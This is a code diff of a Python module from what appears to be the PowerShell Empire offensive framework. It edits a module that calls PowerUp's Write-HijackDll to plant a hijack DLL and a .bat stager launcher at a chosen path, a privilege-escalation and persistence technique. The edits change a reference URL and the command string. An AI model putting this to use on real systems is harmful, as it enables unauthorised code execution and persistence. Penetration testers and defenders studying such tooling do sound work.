@@ -26,7 +26,7 @@ class Module:
             'MinPSVersion' : '2',
             
             'Comments': [
-                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
+                'https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp'
             ]
         }
 
@@ -100,7 +100,7 @@ class Module:
 
 
         hijackPath = self.options['HijackPath']['Value']
-        batPath = "\\".join(hijackPath.split("\\")[0:-1]) + "\debug.bat".replace('/', os.sep)
+        batPath = "\\".join(hijackPath.split("\\")[0:-1]) + "\debug.bat"
 
         # generate the .bat launcher code to write out to the specified location
         l = self.mainMenu.stagers.stagers['launcher_bat']
@@ -123,6 +123,6 @@ class Module:
             print helpers.color("[!] Error in launcher .bat generation.")
             return ""
         else:
-            # script += "Write-HijackDll -HijackPath '"+hijackPath+"';"
-            script += "Write-HijackDll -OutputFile '"+str(hijackPath)+"' -BatPath '"+str(batPath)+"';"
+            script += "Write-HijackDll -HijackPath '"+hijackPath+"';"
+
             return script
